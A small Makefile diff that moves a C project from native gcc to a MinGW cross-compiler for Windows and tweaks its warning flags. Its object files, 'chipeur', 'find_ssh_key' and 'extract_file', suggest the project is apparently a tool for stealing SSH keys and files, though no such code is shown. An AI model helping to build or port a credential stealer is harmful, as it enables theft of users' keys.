@@ -8,11 +8,9 @@ OBJ_DIR=obj/
 # add the object file used here
 OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o
 
-CC=gcc
-
-# -Walloc-zero
-CFLAGS=-g -static -fPIE -O2 -Warray-bounds -Wsequence-point -Wnull-dereference \
--Wpointer-arith -Wcast-qual -Wcast-align -I$(INCLUDE_DIR)
+CC=x86_64-w64-mingw32-gcc
+CFLAGS=-g -fPIE -O2 -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
+-Wpointer-arith -Wcast-qual -Wcast-align=strict -I$(INCLUDE_DIR)
 
 # not needed for now
 LDFLAGS= # -Wl,--strip-all
